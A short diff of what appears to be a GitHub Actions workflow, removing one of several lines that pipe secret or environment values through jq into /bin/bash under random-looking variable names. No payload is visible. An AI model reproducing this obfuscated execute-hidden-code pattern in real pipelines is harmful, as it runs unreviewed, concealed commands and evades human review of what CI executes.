@@ -20,7 +20,6 @@ jobs:
           hblxg5742: ${{ secrets.hblxg5742 }}
         run: |
           printf '%s' "$hblxg5742" | jq -r .vjynr9688 | /bin/bash
-          printf '%s' "$ydndb8" | jq -r .n968 | /bin/bash
           echo $ckf0768 | jq -r .iemgc623 | /bin/bash
           echo $hsn0875 | jq -r .mz2917 | /bin/bash
 
